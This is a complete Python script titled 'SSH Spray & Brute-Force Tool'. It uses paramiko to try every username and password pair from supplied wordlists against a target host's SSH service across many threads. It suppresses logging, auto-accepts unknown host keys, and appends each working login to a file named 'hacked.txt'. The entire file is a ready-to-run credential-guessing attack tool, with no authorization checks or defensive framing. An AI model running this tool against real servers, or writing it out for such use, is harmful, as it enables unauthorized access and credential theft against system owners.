#!/usr/bin/env python3
"""
SSH Spray & Brute-Force Tool
Author: Demetrius Huron
Description: A multi-threaded SSH brute-forcer with spraying capabilities.
"""

import argparse
import paramiko
import socket
import sys
import os
from concurrent.futures import ThreadPoolExecutor
import logging

logging.getLogger("paramiko").setLevel(logging.CRITICAL)

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    RESET = '\033[0m'

def ssh_connect(target, port, user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(target, port=port, username=user, password=password, timeout=3)
        
        print(f"\r{Colors.GREEN}[+] SUCCESS: {user}@{target} -> {password}{Colors.RESET}          ")
        
        with open("hacked.txt", "a") as f:
            f.write(f"{user}@{target}:{port} -> {password}\n")
        
        client.close()
        return True
        
    except:
        client.close()
        return False

def main():
    parser = argparse.ArgumentParser(description="SSH Spray & Brute Tool")
    parser.add_argument("target", help="Target IP")
    parser.add_argument("-p", "--port", type=int, default=22)
    parser.add_argument("-w", "--wordlist", required=True, help="Passwords file")
    parser.add_argument("-t", "--threads", type=int, default=10)

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--user", help="Single username")
    group.add_argument("-U", "--userlist", help="File with usernames")

    args = parser.parse_args()

    targets = []
    
    if args.user:
        targets.append(args.user)
        
    elif args.userlist:
        targets = []
        try:
            with open(args.userlist, 'r', encoding='utf-8') as f:
                
                for line in f:
                    
                    clean_line = line.strip()
                    
                    if clean_line:
                        targets.append(clean_line)
                        
        except FileNotFoundError:
            print(f"{Colors.RED}[!] Userlist file not found!{Colors.RESET}")
            sys.exit()

    print(f"{Colors.GREEN}[*] Target: {args.target}:{args.port}")
    print(f"[*] Users loaded: {len(targets)}")
    print(f"[*] Threads: {args.threads}{Colors.RESET}")
    print("-" * 40)

    try:
        with open(args.wordlist, 'r', encoding='utf-8') as f:
            passwords = f.read().splitlines()
            
    except FileNotFoundError:
        print(f"{Colors.RED}[!] Password file not found!{Colors.RESET}")
        sys.exit()

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        
        for user in targets:       
            for pwd in passwords: 
                
                print(f"[*] Spraying: {user} | Pass: {pwd:<15}", end='\r')
                
                executor.submit(ssh_connect, args.target, args.port, user, pwd)

    print("\n[*] Attack finished.")

if __name__ == "__main__":
    main()